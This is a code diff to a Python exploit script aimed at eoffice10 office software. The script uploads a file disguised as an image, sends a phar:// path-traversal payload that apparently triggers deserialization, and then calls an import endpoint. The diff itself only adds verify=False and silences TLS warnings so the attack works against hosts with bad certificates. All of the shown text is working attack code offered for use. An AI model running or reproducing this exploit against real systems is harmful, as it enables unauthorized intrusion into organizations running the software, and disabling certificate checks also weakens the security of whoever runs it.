@@ -1,6 +1,8 @@
 import requests
 import base64
 import re
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def exploit(url):
 
@@ -15,7 +17,7 @@ def exploit(url):
         "Content-Type": "multipart/form-data; boundary=mkbk",
     }
     data1 = f"--mkbk\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"register.inc\"\r\nContent-Type: image/jpeg\r\n\r\n{mkbt}\r\n--mkbk--"
-    response1 = requests.post(url1, headers=headers1, data=data1)
+    response1 = requests.post(url1, headers=headers1, data=data1, verify=False)
 
 
     match = re.search(r'"attachment_id":"(.*?)"', response1.text)
@@ -27,7 +29,7 @@ def exploit(url):
         "Content-Type": "application/x-www-form-urlencoded"
     }
     data2 = "source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F"
-    response2 = requests.post(url2, headers=headers2, data=data2)
+    response2 = requests.post(url2, headers=headers2, data=data2, verify=False)
 
     url3 = f"{url}/eoffice10/server/public/api/empower/import"
     headers3 = {
@@ -35,7 +37,7 @@ def exploit(url):
         "Content-Type": "application/x-www-form-urlencoded"
     }
     data3 = f"type=mkbk&file={attachment_id}"
-    response3 = requests.post(url3, headers=headers3, data=data3)
+    response3 = requests.post(url3, headers=headers3, data=data3, verify=False)
 
     
     if response3.status_code == 200:
